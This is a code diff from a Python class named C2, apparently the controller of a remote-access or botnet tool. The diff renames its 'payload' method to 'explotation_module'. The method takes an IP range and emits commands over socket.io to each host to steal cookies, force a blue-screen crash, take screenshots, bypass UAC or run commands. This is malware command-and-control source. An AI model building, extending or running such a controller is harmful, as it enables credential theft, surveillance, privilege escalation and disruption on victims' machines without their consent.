@@ -105,30 +105,30 @@ class C2:
 
         return ip_addresses
 
-    def payload(self, data):
-        payload_type = data['payload']
+    def explotation_module(self, data):
+        explotation_module_type = data['explotation_module']
         ip_range = data['ip']
 
         ip_addresses = self.parce_ip(ip_range)
         print(ip_addresses)
 
-        if payload_type == "steal-cookie":
+        if explotation_module_type == "steal-cookie":
             for ip in ip_addresses:
                 self.sio.emit('steal-cookie', {"ip": ip})
             
-        if payload_type == "bsod":
+        if explotation_module_type == "bsod":
             for ip in ip_addresses:
                 self.sio.emit('bsod', {"ip": ip})
         
-        if payload_type == "screen-shot":
+        if explotation_module_type == "screen-shot":
             for ip in ip_addresses:
                 self.sio.emit('screen-shot', {"ip": ip})
         
-        if payload_type == "uac-bypass":
+        if explotation_module_type == "uac-bypass":
             for ip in ip_addresses:
                 self.sio.emit('uac-bypass', {"ip": ip})
         
-        if payload_type == "send-command":
+        if explotation_module_type == "send-command":
             for ip in ip_addresses:
                 self.sio.emit('send-command', {"ip": ip})
 
